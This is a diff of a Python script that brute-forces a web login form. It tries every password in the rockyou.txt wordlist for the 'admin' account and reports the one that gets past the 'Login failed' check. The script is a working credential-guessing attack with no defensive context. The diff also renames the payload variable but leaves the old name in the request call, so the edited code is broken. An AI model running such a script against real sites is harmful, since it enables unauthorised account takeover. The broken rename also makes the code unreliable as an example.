@@ -20,12 +20,12 @@ def get_arguments():
 target_url = get_arguments().target
 
 # Guessing Login Password
-data = {"username": "admin", "password": "", "Login": "submit"}
+data_dict = {"username": "admin", "password": "", "Login": "submit"}
 
 with open("/usr/share/wordlists/rockyou.txt", "r") as wordlist_file:
     for line in wordlist_file:
         word = line.strip()
-        data["password"] = word
+        data_dict["password"] = word
         response = requests.post(target_url, data=data)
         if "Login failed" not in response.content.decode(errors="ignore"):
             print("[+] Got the password: " + str(word))
